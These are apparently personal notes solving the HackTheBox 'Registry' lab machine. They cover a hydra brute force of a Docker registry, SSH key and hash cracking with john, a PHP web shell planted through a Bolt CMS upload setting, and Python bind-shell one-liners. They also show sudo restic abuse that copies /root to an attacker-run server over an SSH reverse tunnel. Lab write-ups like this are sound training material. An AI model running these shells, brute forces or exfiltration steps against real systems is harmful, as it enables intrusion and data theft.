## Notes for Registry HackTheBox machine

# Enumerating the basics

Standard nmap. 

* /bolt is something
* /install contains weird "gzipped data" that is not a gzip archive

* /bolt/bolt leads to login screen
* http://10.10.10.159/bolt/bolt/login

No credentials

# Docker registry

Docker registry is there, ok. Only visible with the proper Host header which we got from the initial nmap.

HTTP GET .bash_history 403 -> is this some user's home directory ? Very strange.

# Brute force Docker Registry password
```
hydra -L words -P words -f docker.registry.htb http-get /v2/
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2020-02-06 10:33:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 196 login tries (l:14/p:14), ~13 tries per task
[DATA] attacking http-get://docker.registry.htb:80//v2/
[80][http-get] host: docker.registry.htb   login: admin   password: admin
```

Great, we can see ```bolt-image``` in there after we use these creds.

## Logging in to Docker

docker login is not successful because of self-signed certificate

```
openssl s_client -connect docker.registry.htb:443 -showcerts
CONNECTED(00000003)
depth=0 CN = docker.registry.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = docker.registry.htb
verify error:num=21:unable to verify the first certificate
verify return:1
---
Certificate chain
 0 s:CN = docker.registry.htb
   i:CN = Registry
-----BEGIN CERTIFICATE-----
MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
PEyspHOCbg1C6a0gI1xo0c0=
-----END CERTIFICATE-----
```

After putting the certificate to the right place in the right format, ```docker pull``` finally works.

Then we can run the container and log in:
```
root@rot-t420:~/htb-notes/registry# docker -v run -it docker.registry.htb/bolt-image:latest /bin/bash
root@27ed4fc85997:/# 
```

Inside the container, from /root/.ssh we can pull a key.

# Cracking passwords

And *ssh2john* to crack it:

```
root@rot-t420:~/htb-notes/registry# john --wordlist=/usr/share/wordlists/rockyou.txt bolt-image-johnkey 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 4 needed for performance.
0g 0:00:00:05 DONE (2020-02-06 15:07) 0g/s 2812Kp/s 2812Kc/s 2812KC/sa6_123..*7¡Vamos!
```

# Looking for history

From *.viminfo* we find something - some files have been edited.

```
root@27ed4fc85997:~# cat /etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
```

And 
```
root@27ed4fc85997:~# cat /var/www/html/sync.sh 
#!/bin/bash
rsync -azP registry:/var/www/html/bolt .
```
# User flag

Now we can log in with ssh as "bolt". And user flag:
```
bolt@bolt:~$ cat user.txt 
ytc0ytdmnzywnzgxngi0zte0otm3ywzi
bolt@bolt:~$
```

# The root flag

What next ?

## Linux smart enum

```
scp -i bolt-image.root_rsa bolt@docker.registry.htb:/dev/shm/rapsa.txt .
Enter passphrase for key 'bolt-image.root_rsa': 
rapsa.txt                                
```

```
p0wny@shell:…/www/html# cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```


```
p0wny@shell:/# cat srv/docker-registry/auth/registry.password
admin:$2y$05$MQ.s8qTZnGX657si5k7a9eCNn3NRccEg1TNoXjNmF2niYQ5FOgMzy

root      1423   983  0 19:55 ?        00:00:03 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
root      1431   982  0 19:55 ?        00:00:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/613c70fa3dba2046a1257c6764d8d65864b93f23e81e907e0d9fb925a8c92d57 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root      1456  1431  0 19:55 ?        00:00:04 registry serve /etc/docker/registry/config.yml
www-data  1598  1194  0 19:57 ?        00:00:00 sh -c python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',11223));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" 2>&1
www-data  1599  1598  0 19:57 ?        00:00:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',11223));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])
www-data  1600  1599  0 19:57 ?        00:00:00 /bin/bash -i
www-data  1604  1600  0 19:57 ? 
```

## Forward shell

Forward shell instead of revere shell for a change :) 

```
p0wny@shell:/# python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',11111));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])" 2>&1

root      2290  1874  0 20:19 pts/1    00:00:00 sudo restic backup -r rest:/root/root.txt
root      2294  2290  0 20:19 pts/1    00:00:00 restic backup -r rest:/root/root.txt
```

## More password cracking

Admin pass cracking with john leads to *strawberry*

bolt admin can then get RCE.

*CVE-2019-9185* does not work, but change main config and upload a php. 

main configuration
```
# Define the file types (extensions to be exact) that are acceptable for upload
# in either 'file' fields or through the 'files' screen.
accept_file_types: [ php, twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg]
```

```
p0wny@shell:…/www/html# cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

```
p0wny@shell:…/www/html# sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

## Firewall bypassing 
There is a firewall that prevents reverse shells, which is annoying. But.

1. Run a local REST server for Restic on the attacker's machine.
2. ssh to the remote server and port forward back some port, like 6510

```
ssh -R 6510:localhost:8000 -i bolt-image.root_rsa bolt@10.10.10.159
```

3. write a password to a file

```
p0wny@shell:/tmp# echo 'a' > pieru
```

4. then 
Then use the RCE to backup the root home directory and the files will appear at the attacker's file system!
```
p0wny@shell:/tmp# sudo /usr/bin/restic backup -r rest:http://localhost:6510 -p pieru /root
```

Now.
```
root@rot-t420:~/htb-notes/registry/restore# ../restic_0.8.3_linux_386 restore -r /tmp/restic 59c0a355 --target .
enter password for repository: 
password is correct
restoring <Snapshot 59c0a355 of [/root] at 2020-02-24 15:36:47.720732907 +0000 UTC by root@bolt> to .
```

The root flag:
ntrkzgnkotaxyju0ntrinda4yzbkztgw

